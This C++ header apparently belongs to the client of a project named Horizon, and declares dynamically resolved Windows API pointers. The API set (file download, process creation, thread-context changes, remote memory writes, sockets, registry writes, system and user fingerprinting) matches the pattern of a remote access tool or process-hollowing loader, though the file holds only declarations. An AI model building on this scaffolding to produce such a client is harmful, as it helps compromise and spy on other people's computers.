#pragma once
#include "Structures.h"

namespace Horizon::Client::Api
{
	inline HMODULE Kernel32;
	inline HMODULE Ntdll;
	inline HMODULE User32;
	inline HMODULE Advapi32;
	inline HMODULE Ws2_32;
	inline HMODULE Urlmon;
	inline fnLoadLibraryW _LoadLibraryW;
	inline fnWideCharToMultiByte _WideCharToMultiByte;
	inline fnMultiByteToWideChar _MultiByteToWideChar;
	inline fnMessageBoxW _MessageBoxW;
	inline fnWriteConsoleW _WriteConsoleW;
	inline fnDeleteFileW _DeleteFileW;
	inline fnGetModuleFileNameW _GetModuleFileNameW;
	inline fnURLDownloadToFileW _URLDownloadToFileW;
	inline fnCreateProcessW _CreateProcessW;
	inline fnGetThreadContext _GetThreadContext;
	inline fnSetThreadContext _SetThreadContext;
	inline fnResumeThread _ResumeThread;
	inline fnReadProcessMemory _ReadProcessMemory;
	inline fnWriteProcessMemory _WriteProcessMemory;
	inline fnWSAStartup _WSAStartup;
	inline fnWSACleanup _WSACleanup;
	inline fnsocket _socket;
	inline fnhtons _htons;
	inline fnInetPtonW _InetPtonW;
	inline fninet_pton _inet_pton;
	inline fnconnect _connect;
	inline fnclosesocket _closesocket;
	inline fnioctlsocket _ioctlsocket;
	inline fnsetsockopt _setsockopt;
	inline fnRtlZeroMemory _ZeroMemory;
	inline fnGetProcessHeap _GetProcessHeap;
	inline fnHeapAlloc _HeapAlloc;
	inline fnHeapReAlloc _HeapReAlloc;
	inline fnHeapFree _HeapFree;
	inline fnVirtualAlloc _VirtualAlloc;
	inline fnVirtualAllocEx _VirtualAllocEx;
	inline fnVirtualFree _VirtualFree;
	inline fnsend _send;
	inline fnrecv _recv;
	inline fnGetSystemInfo _GetSystemInfo;
	inline fnRtlGetVersion _RtlGetVersion;
	inline fnGetUserNameW _GetUserNameW;
	inline fnGetComputerNameW _GetComputerNameW;
	inline fnNtQuerySystemInformation _NtQuerySystemInformation;
	inline fnNtQueryInformationProcess _NtQueryInformationProcess;
	inline fnCloseHandle _CloseHandle;
	inline fnGetStdHandle _GetStdHandle;
	inline fnCreateToolhelp32Snapshot _CreateToolhelp32Snapshot;
	inline fnProcess32FirstW _Process32FirstW;
	inline fnProcess32NextW _Process32NextW;
	inline fnOpenProcess _OpenProcess;
	inline fnTerminateProcess _TerminateProcess;
	inline fnRegOpenKeyExW _RegOpenKeyExW;
	inline fnRegGetValueW _RegGetValueW;
	inline fnRegCreateKeyExW _RegCreateKeyExW;
	inline fnRegSetValueExW _RegSetValueExW;
	inline fnRegCloseKey _RegCloseKey;
	inline fnRegQueryValueExW _RegQueryValueExW;
	inline fnEnumDisplayDevicesW _EnumDisplayDevicesW;
	inline fnGlobalMemoryStatusEx _GlobalMemoryStatusEx;
	inline fnGetCurrentHwProfileW _GetCurrentHwProfileW;
	inline char* hardwareId;

	bool LoadApis();

	void MultiToWide(char*, wchar_t*);

	void WideToMulti(const wchar_t*, char*);
}
